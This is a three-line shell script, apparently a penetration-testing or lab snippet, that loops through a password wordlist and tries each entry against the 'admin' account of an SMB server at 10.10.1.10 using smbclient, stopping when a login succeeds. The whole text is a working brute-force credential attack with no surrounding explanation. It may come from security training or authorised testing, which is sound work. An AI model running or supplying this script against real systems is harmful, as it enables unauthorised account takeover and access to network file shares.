for pass in $(cat /path/to/wordlist); do
  smbclient -L //10.10.1.10 -U admin%"$pass" 2>/dev/null && echo "Success: $pass" && break
done
